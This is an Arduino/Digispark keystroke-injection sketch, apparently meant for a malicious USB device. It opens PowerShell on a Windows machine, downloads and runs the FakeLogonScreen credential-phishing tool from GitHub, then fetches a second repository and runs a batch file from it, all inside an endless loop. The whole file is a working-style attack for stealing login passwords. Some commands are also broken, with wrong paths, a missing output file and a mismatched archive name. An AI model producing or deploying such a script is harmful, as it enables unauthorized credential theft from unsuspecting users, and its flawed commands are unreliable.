#include "DigiKeyboardFr.h"
void setup() {
}
 
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboardFr.println("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardFr.print("Invoke-WebRequest -Uri 'https://github.com/bitsadmin/fakelogonscreen/releases/download/1.1/fakelogonscreen_trunk.zip';");
  DigiKeyboard.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Expand-Archive -Path 'C:\\Users\\%USERPROFILE%\\Download\\fakelogonscreen_trunk.zip' -Force;");
  DigiKeyboard.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardFr.print("start-process C:\\Users\\%USERPROFILE%\\Download\\fakelogonscreen_trunk\\FakeLogonScreenToFile.exe;");
  DigiKeyboard.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardFr.print("Invoke-WebRequest -Uri 'https://github.com/Adxmxx/FakeLogonScreenAdam/archive/refs/heads/main.zip';");
  DigiKeyboard.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Expand-Archive -Path 'C:\\Users\\%USERPROFILE%\\Download\\fakelogonscreen_trunk.zip' -Force;");
  DigiKeyboard.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardFr.print("start-process C:\\Users\\%USERPROFILE%\\Download\\FakeLogonScreenAdam-main\\script.bat;");
}
